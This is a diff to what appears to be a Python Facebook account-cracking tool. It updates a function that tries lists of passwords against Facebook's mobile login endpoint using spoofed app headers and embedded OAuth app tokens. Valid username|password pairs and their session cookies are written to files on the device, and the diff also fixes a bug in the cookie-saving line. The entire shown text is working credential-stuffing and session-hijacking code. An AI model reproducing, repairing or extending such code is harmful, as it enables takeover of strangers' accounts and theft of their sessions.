@@ -1581,7 +1581,7 @@ def x(uid,pwx,tl):
             'X-Fb-Client-Ip': 'True',
             'X-Fb-Server-Cluster': 'True',
             'Content-Length': '847'}
-            url = "https://api.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1711,58 +1711,74 @@ def freeq(uid,pwx,tl):
     global loop
     global oks
     global cps
-    global bkas
-    sys.stdout.write(f"\r {green}(M4) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
-            'email': uid,
-            'password': pw,
-            'generate_analytics_claims': '1',
-            'community_id': '',
-            'cpl': 'true',
-            'try_num': '1',
-            'family_device_id': str(uuid.uuid4()),
-            'credentials_type': 'password',
-            'source': 'login',
-            'error_detail_type': 'button_with_disabled',
-            'enroll_misauth': 'false',
-            'generate_session_cookies': '1',
-            'generate_machine_id': '1',
-            'currently_logged_in_userid': '0',
-            'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
+"email": uid,
+"password": pw,
+"method": "post",
+"pretty": "false",
+"format": "json",
+"server_timestamps": "true",
+"locale": "en_US",
+"purpose": "fetch",
+"fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+"fb_api_caller_class": "graphservice",
+"client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),
+"lois_settings": "lois_token",
+"lara_override": "server_params",
+"is_from_logged_out": "0",
+"layered_homepage_experiment_group": "null",
+"device_id": str(uuid.uuid4()),
+"waterfall_id": str(uuid.uuid4()),
+"INTERNAL__latency_qpl_instance_id": "71821365400215",
+"is_platform_login": "0",
+"header_transparency_event_location": "login",
+"INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),
+"family_device_id": str(uuid.uuid4()),
+"offline_experiment_group": "caa_iteration_v6_perf_fb_2",
+"INTERNAL_INFRA_THEME": "harm_f",
+"headers_flow_id": str(uuid.uuid4()),
+"transparency_event_type": "affirmative_action",
+"header_transparency_event_name": "login_button_clicked",
+"is_from_logged_in_switcher": "0",
+"bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
+"app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+"scale": "2",
+"styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
+"using_white_navbar": "True",
+"pixel_ratio": "2",
+"is_push_on": "True",
+"bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
+"fb_api_analytics_tags": '["GraphServices"]',
+"client_trace_id": str(uuid.uuid4()),
+"generate_session_cookies": "1",
+"generate_analytics_claim": "1",
+"error_detail_type": "button_with_disabled"}
             headers = {
-            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
             'Host': 'graph.facebook.com',
             'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
             'Priority': 'u=3, i',
-            'X-Fb-Sim-Hni': str(random.randint(20000, 40000)),
-            'X-Fb-Net-Hni': str(random.randint(20000, 40000)),
+            'X-Fb-Sim-Hni': '45204',
+            'X-Fb-Net-Hni': '45201',
             'X-Fb-Connection-Quality': 'GOOD',
             'Zero-Rated': '0',
-            'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
-            'X-Fb-Connection-Bandwidth': str(random.randint(20000, 40000)),
+            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/419.0.0.31459;FBBV/549648855;FBRV/549648855;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]",
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-Fb-Connection-Bandwidth': '24807555',
             'X-Fb-Connection-Type': 'MOBILE.LTE',
-            'X-Fb-Device-Group': '5035',
+            'X-Fb-Device-Group': '5120',
             'X-Tigon-Is-Retry': 'False',
             'X-Fb-Friendly-Name': 'authenticate',
             'X-Fb-Request-Analytics-Tags': 'unknown',
             'X-Fb-Http-Engine': 'Liger',
             'X-Fb-Client-Ip': 'True',
             'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '27'}
+            'Content-Length': '847'}
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
@@ -1776,7 +1792,7 @@ def freeq(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-OK] {uid}|{pw}")
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
@@ -1787,7 +1803,7 @@ def freeq(uid,pwx,tl):
                         else:
                            print(f" {green}(ATOM-OK) {uid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
             else:
@@ -1797,7 +1813,6 @@ def freeq(uid,pwx,tl):
         time.sleep(10)
     except Exception as e:
         pass
-
 
 def d(uid,pwx,tl):
     global oks
